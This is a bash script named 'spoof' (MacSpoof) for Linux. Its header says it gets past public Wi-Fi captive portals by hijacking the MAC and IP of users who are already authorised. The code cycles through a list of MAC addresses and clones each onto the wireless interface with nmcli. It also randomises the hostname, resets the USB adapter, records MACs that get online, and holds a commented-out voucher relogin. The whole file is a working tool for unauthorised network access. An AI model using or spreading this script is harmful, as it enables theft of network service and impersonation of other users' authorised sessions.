#!/usr/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
killall spoof > /dev/null

defaultiface="wlxe8de2719159a"
defaultssid="RIZIK_WIFI"
MAC="/home/admin0/MacSpoof/stable.txt"
macalive="/home/admin0/MacSpoof/macid.txt"
usbdevice="ralink"
# =========================================================================== #
#           FILE:  spoof                                                      #
#          USAGE:  sudo spoof	           	                              #
#                                                                             #
#    DESCRIPTION:  This script helps to pass through the captive portals in   #
#                  public Wi-Fi networks. It hijacks IP and MAC from somebody #
#                  who is already connected and authorized on captive portal. #
#   REQUIREMENTS:  coreutils, nmtui  	                                      #
#          NOTES:  Let the information always be free!                        #
#         AUTHOR:  jalilkhoironi  <@systematicat>		              #
#        VERSION:  1.0                                                        #
#        CREATED:  16.12.2016 - 23:59                                         #
#       REVISION:  ---                                                        #
#      COPYRIGHT:  2021 Stanislav "systematicat" Kotivetc                     #
#        LICENSE:  WTFPL v2                                                   #
# =========================================================================== #


## Check for running as root.
function root() {
	if ! [ $(id -u) = 0 ]; then
	 echo "The script need to be run as root." >&2
	 exit 0
	fi
}

function macprase() {
macfile="$MAC"
mac1="$(cat $macfile | awk '/:/ {print $1}'| grep -i ':')"
mac2="$(cat $macfile | awk '/:/ {print $2}'| grep -i ':')"
mac3="$(cat $macfile | awk '/:/ {print $3}'| grep -i ':')"
mac4="$(cat $macfile | awk '/:/ {print $4}'| grep -i ':')"
mac5="$(cat $macfile | awk '/:/ {print $5}'| grep -i ':')"
macout="$(echo "$mac1" "$mac2" "$mac3" "$mac4" "$mac5")"
rm $macfile
echo $macout | tr -s '[:space:]' '\n' | sort | uniq >> $macfile
}
macprase

## Find the initial parameters of wireless interface.
function device() {
interface="$(ip -o -4 route show to default | awk '/dev/ {print $5}' | awk '{print $1}')" 
wifissid="$(iw dev "$interface" link | awk '/SSID/ {print $NF}')" 
}
device >/dev/null

clear
if [[ "$interface" = $(echo) ]]; then
 interface="$defaultiface"
 wifissid="$defaultssid"
	toilet $(echo "MacSpoof")
	echo " # Using default interface" "$defaultiface" "?"
        echo " # And Wifi SSID" "$wifissid" "?"
	echo " Press any Key to continue or CTRL + Z to cancel and CTRL + C to change "
sleep 3 #	read
else
        toilet $(echo "MacSpoof")
	echo " # Using interface" "$interface" "?"
	echo " # And Wifi SSID" "$wifissid" "?"
        echo " Press any Key to continue or CTRL + C to cancel"
sleep 3 #	read
fi

## Option  parameters of wireless interface.
while getopts ":i:c:f:" OPTION
do
  case $OPTION in
    i)
      interface="$OPTARG";;
    c)
      wifissid="$OPTARG";;
    f)
      MAC="$OPTARG";;
  esac
done

## Find status of wireless interface.
function load() {
	localip="$(ip -o -4 route get 1 | awk '/src/ {print $7}')"
	gateway="$(ip -o -4 route show to default | awk '/via/ {print $3}')"
	broadcast="$(ip -o -4 addr show dev "$interface" | awk '/brd/ {print $6}')"
	macaddress="$(ip -0 addr show dev $interface \
	| awk '/link/ && /ether/ {print $2}' \
	| tr '[:upper:]' '[:lower:]')"
	dns="$(nslookup "$gateway" | grep -i "name =" | awk '{print $4}')"
	status="OFFLINE"
	download="$(ifconfig "$interface" | grep -i 'RX packets'| awk '/RX/ {print $6 $7}')"
	upload="$(ifconfig "$interface" | grep -i 'TX packets'| awk '/TX/ {print $6 $7}')"
	id="$(curl "$gateway"/status -s | awk '/Member/{print $137}'| cut -d ">"  -f 2| cut -d "<" -f 1)"

}

## Status connection network
function status() {
clear
echo "                   "$status"                     "
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo "	  ID Member :" "$id"
echo "          Interface :" "$interface"
echo "          Wifi SSID :" "$wifissid"
echo "         DNS Server :" "$dns"
echo "        MAC address :" "$macaddress"
echo "         IP address :" "$localip"
echo "            Gateway :" "$gateway"
echo "           Download :" "$download"
echo "             Upload :" "$upload"
echo "              Date  :" $(date +%T)
#echo " "

}

## IF connection online save the mac
function savemac() {
                echo "$macaddress" >> $macalive
                macalive0="$(cat "$macalive" | grep -i ':')"
		rm $macalive
                echo $macalive0 | tr -s '[:space:]' '\n' | sort | uniq >> $macalive
}

function savemacid() {
                echo "$macaddress $id">> $macalive
}

## Relogin in userpage
function relogin() {
curl --data "username=$voucher&password=$voucher" $gateway/login.html --connect-timeout 1 --silent
}

## IF connection offline/online
function online() {
                status="ONLINE"
		printf '%s\n' "$(clear ; status)"
		#savemacid
}

function offline() {
		printf '%s\n' "$(clear ; status)"
                echo "[#] Menyambungkan koneksi ......"
                
		echo -ne '[#] #####                                 (15%)\r'
		__set_random_hostname     
		echo -ne '[-] ###############                       (45%)\r'  
	        usbr="$(lsusb | grep -i "ralink" | awk '/ / {print "usbreset /dev/bus/usb/"$2"/"$4}' | cut -d ":" -f 1)"
	        $usbr >/dev/null
	        echo -ne '[|] ###############                       (45%)\r'
	        sleep 1
	        echo -ne '[/] ####################                  (55%)\r'
                nmcli connection down "$wifissid" >/dev/null 
                echo -ne '[-] #########################             (75%)\r'
                nmcli connection modify "$wifissid" wifi.cloned-mac-address $M  >/dev/null
                echo -ne '[\] ##############################        (85%)\r'
                nmcli connection up "$wifissid" >/dev/null
                echo -ne '[-] ###################################   (100%)\r'
                echo -ne '\n'
		#relogin >/dev/null
}

## Test internet access
function check() {
wget -q --spider http://google.com --timeout 1 >/dev/null
      if [[ $? -eq 0 ]]; then
		load
		online
		sleep 3
		check
		#offline
	else
		offline
	fi
}


# Use Ctrl + C to force change mac again
control_c() {
	nmcli connection up "$wifissid"
	sudo systemctl restart NetworkManager
	offline
	trap 0
}




## Change Mac for changing
function change() {
        for M in $(<$MAC)
        do
		if [[ "${M:0:1}" != "#" ]]
		then
 			trap control_c SIGINT
			sleep 2
			load >/dev/null
			check
		fi
	done
}


## Random Hostname for dhcp Leases
__set_random_hostname() {
  new_hostname=$(echo "V$(head -n1 < <(fold -w4 < <(tr -cd '0-9' < /dev/urandom)))")
  # set new hostname
  hostnamectl set-hostname "$new_hostname"
  # set new hostname in /etc/hosts
  sed -i "2 s/^.*$/127.0.1.1       $new_hostname/g" /etc/hosts
}


## Main and Looping
function main() {
while :
do
	change
	sudo systemctl restart NetworkManager

done
}




root
main
